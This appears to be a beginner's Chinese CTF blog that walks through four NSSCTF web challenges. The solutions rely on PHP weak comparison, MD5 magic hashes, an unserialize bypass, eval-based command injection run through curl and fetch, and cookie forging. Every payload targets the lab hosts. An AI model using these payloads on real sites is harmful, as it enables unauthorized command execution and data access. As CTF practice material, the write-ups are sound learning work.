---
title: "nssctf学习中"
published: 2025-11-11
description: "CTF 学习笔记与技术复盘"
category: 刷题
tags: [刷题]
---
这是一个基于nssctf做题的wp，本人纯新手。
做题没有顺序，基本是看我自己写哪一题，就写这题的wp，不分难度的。

# #1.[NSSCTF 2022 Spring Recruit]babyphp

题目内容:

```
\<?php
highlight_file(__FILE__);
include_once('flag.php');
if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){
    if(isset($_POST['b1'])&&$_POST['b2']){
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){
                echo flag;
            }else{
                echo "yee";
            }
        }else{
            echo "nop";
        }
    }else{
        echo "go on";
    }
}else{
    echo "let's get some php";
}
?> let's get some php_
```



分析代码
首先，`isset(_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval(_POST['a'])`
存在a，a不含0-9的数字，intval(_POST['a']) 必须为真
查询代码，intval() 在转换时会尝试从字符串开头提取数字，直到遇到非数字字符。
preg_match 是 PHP 中用于执行正则表达式匹配的函数。
所有a可以用数组a[]=1
这样均满足 所有条件
第二，isset($_POST['b1']) && _POST['b2']
b1，b2有值且非空，然后比较md5
同样数组，MD5返回null
b1[]=2,b2[]=3
最后，`_POST['c1'] != $_POST['c2'] && is_string($_POST['c1']) && is_string($_POST['c2']) && md5($_POST['c1']) == md5(_POST['c2'])`
c1与c2均为字符串，且不同，又比较md5还是若比较，上网随便查一下，用科学计数法MD5，0e被当成0，随便找md5为0e开头的字符串。
所以 C:\Users\G1731>curl -X POST -d "a[]=1&b1[]=1&b2[]=2&c1=240610708&c2=QNKCDZO" http://node4.anna.nssctf.cn:28382/
用curl执行post，
得到flag，NSSCTF{2fd7b1ec-41c5-4895-a5d3-bc56cb172231}

---
# #2.[HUBUCTF 2022 新生赛]checkin

```
<?php
show_source(__FILE__);
username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you"; 
include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo flag;
}else{
    echo "username or password error!";

}

?>
```

get传参，分析一下代码
username = "this_is_secret";
password = "this_is_not_known_to_you";
定义账号，密码，然后又here I changed those two ，那直接就进入猜测阶段了，因为这用户名和密码要是有具体值，那不给其他提示就是猜了，又加上这是新生赛的题，初步猜测是空的吧。
data_unserialize = unserialize(_GET['info']);
反序列化，去查一下作用，unserialize() 函数会将用户通过 GET 参数 info 传入的字符串，还原为 PHP 中的变量。
if (data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo flag;
}else{
    echo "username or password error!";
这一段要求弱比较我们传入的是否与服务器相等。
大抵思路就这样了，反序列化我不是很懂，所以问了一下ai

一、先明确序列化字符串的通用格式（数组类型）
PHP 中数组序列化后的格式是：a:数组长度:{键1的类型:键1长度:"键1值";值1的类型:值1长度:值1内容;键2的类型:键2长度:"键2值";值2的类型:值2长度:值2内容;}
a：表示变量类型是 array（数组）
i：表示变量类型是 integer（整数）
s：表示变量类型是 string（字符串）
冒号后的数字：表示 “长度”（数组长度 / 字符串长度，整数无长度属性）
仔细看看后，我们就能推出我们要传参的值了，info=a:2:{s:8:"username";i:0;s:8:"password";i:0;}
http: //node5.anna.nssctf.cn:26551/?info=a:2:{s:8:%22username%22;i:0;s:8:%22password%22;i:0;}
拿下flag
NSSCTF{ecd62ebd-98ea-4a71-aded-efab0995f71d}
也是运气好一点，弱比较成立了，不然又要卡一会了。

---
# #3.[羊城杯 2020]easycon

http: //node4.anna.nssctf.cn:28048/，给了个靶机点进去一看
![alt text](/images/QQ20251114-185817.png)
看到这个，我还以为我开错网站，看得跟什么软件的官方网站一样，确认几次后，才肯定这是我们题目的网站，嗯，没什么具体的思路，扫一扫

```
开始扫描......
http: //node4.anna.nssctf.cn:28048/index.php
http: //node4.anna.nssctf.cn:28048/.htaccess-local
http: //node4.anna.nssctf.cn:28048/.htaccess.txt
http: //node4.anna.nssctf.cn:28048/.htaccess/
http: //node4.anna.nssctf.cn:28048/.htaccess.BAK
```
没什么特别明显的东西，看一下robot
```
http: //node4.anna.nssctf.cn:28048/robots.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at node4.anna.nssctf.cn Port 28048</address>
</body></html>
```
404都来了，看来目前是彻底没头绪了，看看能不能直接访问源码
C: \Users\G1731>curl http://node4.anna.nssctf.cn:28048/index.php

```html
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color:        #FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>

    <br>
</div>
    </body>
</html>

<script>alert('eval post cmd')</script>
```
直接访问网站是加载不出来的，我用curl才有回应，这个代码告诉我们通过POST请求提交cmd，利用eval执行命令，那我们就试一试我的常用两件套，ls -la与cat
```bash -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cmd=system('ls -la /');" http://node4.anna.nssctf.cn:28048/index.php

<html>
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color:        #FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>

    <br>
</div>
    </body>
</html>

<script>alert('eval post cmd')</script>total 64
drwxr-xr-x    1 root root 4096 Nov 14 09:52 .
drwxr-xr-x    1 root root 4096 Nov 14 09:52 ..
-rwxr-xr-x    1 root root    0 Nov 14 09:52 .dockerenv
lrwxrwxrwx    1 root root    7 Oct  6  2021 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    5 root root  340 Nov 14 09:52 dev
drwxr-xr-x    1 root root 4096 Nov 14 09:52 etc
drwxr-xr-x    2 root root 4096 Apr 15  2020 home
lrwxrwxrwx    1 root root    7 Oct  6  2021 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Oct  6  2021 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Oct  6  2021 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Oct  6  2021 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Oct  6  2021 media
drwxr-xr-x    2 root root 4096 Oct  6  2021 mnt
drwxr-xr-x    2 root root 4096 Oct  6  2021 opt
dr-xr-xr-x 1082 root root    0 Nov 14 09:52 proc
drwx------    2 root root 4096 Oct  6  2021 root
drwxr-xr-x    1 root root 4096 Jan 19  2022 run
lrwxrwxrwx    1 root root    8 Oct  6  2021 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Oct  6  2021 srv
dr-xr-xr-x   13 root root    0 Nov 14 09:52 sys
drwxrwxrwt    1 root root 4096 Nov 14 09:52 tmp
drwxr-xr-x    1 root root 4096 Oct  6  2021 usr
drwxr-xr-x    1 root root 4096 Jan 19  2022 var
```
我靠，居然没看见flag相关的文件，那猫猫学长暂时不能出击了，再看看网站目录有没有
```fetch('http://node4.anna.nssctf.cn:28048/index.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=system("ls -l");'
})
.then(r => r.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
Promise {<pending>}
VM21: 1 Fetch finished loading: POST "http://node4.anna.nssctf.cn:28048/index.php".
(anonymous) @ VM21:1
VM21: 7 
<html>
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color: 	#FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>
    
    <br>
</div>
    </body>
</html>

<script>alert('eval post cmd')</script>total 220
-rwxrwxrwx 1 root root 129904 Aug 29  2020 bbbbbbbbb.txt
-rwxrwxrwx 1 root root  49898 Aug 29  2020 gw.jpg
-rwxrwxrwx 1 root root  22308 Aug 29  2020 gw2.jpg
-rwxrwxrwx 1 root root  10918 Jan 19  2022 index.html
-rwxrwxrwx 1 root root    394 Aug 29  2020 index.php
```
其实本来想用curl的，但是一直显示没连接上服务器，只能试一试JavaScript了，不过还好成功了，这里面返回了一个巨可疑的文件，bbbbbbbbb.txt，就是它，拿下
```fetch('http://node4.anna.nssctf.cn:28048/index.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=system("cat bbbbbbbbb.txt");'
})
.then(r => r.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```
执行该post后，我们得到了一串特别特别长的base64
```
</script>/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYJ..........................................
```
很长很长，我就不贴出来了，我放出来的不足千分之一，稍微研究了一下，发现这是图片base64解码的结果，我们扔给随波逐流，让它解码一下，最后得到这么一张图片
![alt text](/images/image_1.jpg)
这图片上是什么人我不知道，但flag来了
**GWHT{do_u_kn0w_c@idao}**
**改成nssctf形式，NSSCTF{do_u_kn0w_c@idao}**

---

# #4.[GDOUCTF 2023]受不了一点

给了一个靶机，点开看一下

```php
error_reporting(0);
header("Content-type:text/html;charset=utf-8");
if(isset(_POST['gdou'])&&isset($_POST['ctf'])){
    $b=$_POST['ctf'];
    $a=$_POST['gdou'];
    if($_POST['gdou']!=$_POST['ctf'] && md5($a)===md5($b)){
        if(isset($_COOKIE['cookie'])){
           if ($_COOKIE['cookie']=='j0k3r'){
               if(isset($_GET['aaa']) && isset($_GET['bbb'])){
                  $aaa=$_GET['aaa'];
                  $bbb=$_GET['bbb'];
                 if($aaa==114514 && $bbb==114514 && $aaa!=$bbb){
                   $give = 'cancanwordflag';
                   $get ='hacker!';
                   if(isset($_GET['flag']) && isset($_POST['flag'])){
                         die($give);
                    }
                   if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
                       die($get);
                    }
                    foreach ($_POST as $key => $value) {
                        $$key = $value;
                   }
                    foreach ($_GET as $key => $value) {
                         $$key = $$value;
                    }
                   echo flag;
            }else{
                  echo "洗洗睡吧";
                 }
    }else{
        echo "行不行啊细狗";
        }
  }
}
else {
  echo '菜菜';
}
}else{
  echo "就这?";
}
}else{
  echo "别来沾边";
}
?>
别来沾边
```
想要获得flag，要过5关。

1.```if(_POST['gdou']!=$_POST['ctf'] && md5($a)===md5(b)){```

md5碰撞，弱比较，利用数组md5返回为null，构造两个数组。

2.```if(isset(_COOKIE['cookie'])){
if (_COOKIE['cookie']=='j0k3r'){```

强制cookie，Cookie: cookie=j0k3r。

3.```if(aaa==114514 && $bbb==114514 && $aaa!=bbb){```

依旧弱比较，aaa不等于bbb，根据字符串在弱比较时会转化成数字，直接搞定。

4.```if(isset(_GET['flag']) && isset($_POST['flag'])){
    die($give);  
}
if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    die(get);
}```
如果post或者get出现flag，直接die掉。

5.```foreach (_POST as $key => $value) {
    $$key = $value;
}
foreach ($_GET as $key => $value) {
    $$key = $$value;
}
echo $flag;```

想要获得flag，就不能覆盖flag的变量名，即在整个post和get的历遍过程中完全不触flag。

**所以我们最后的指令就完成了。**

**curl -X POST "http://node4.anna.nssctf.cn:28925/?aaa=114514&bbb=114514a"  -H "Cookie: cookie=j0k3r" -d "gdou[]=1&ctf[]=2"**

拿到flag，**NSSCTF{2de514f9-94c3-4f50-b0fe-168893466643}**
这题其实最后一步有点搞的，我一开始都没看懂是啥，要怎么不影响flag，也是大道至简的拿到flag了。


---

5.





---





---

版权声明：本文由白白毛毛创作，转载请注明出处。

